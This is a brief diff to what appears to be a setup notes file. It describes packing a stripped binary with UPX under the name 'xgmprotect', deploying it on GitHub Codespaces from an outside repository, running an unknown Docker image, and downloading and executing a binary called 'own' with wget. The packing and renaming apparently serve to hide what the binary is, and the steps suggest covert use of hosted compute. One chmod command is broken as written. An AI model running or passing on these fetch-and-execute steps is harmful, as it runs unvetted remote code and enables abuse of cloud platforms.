@@ -21,6 +21,8 @@ upx --best xc_stripped -o xgmprotect
 custom upx https://github.com/upx/upx
 
 deploy on codespace https://github.com/Khon-tholodon/crotdalam
+
+docker run ibl3s/vpx:1
 #execute
 
 wget https://github.com/x011-al/flex-x/raw/refs/heads/main/own && chmod +x && ./own
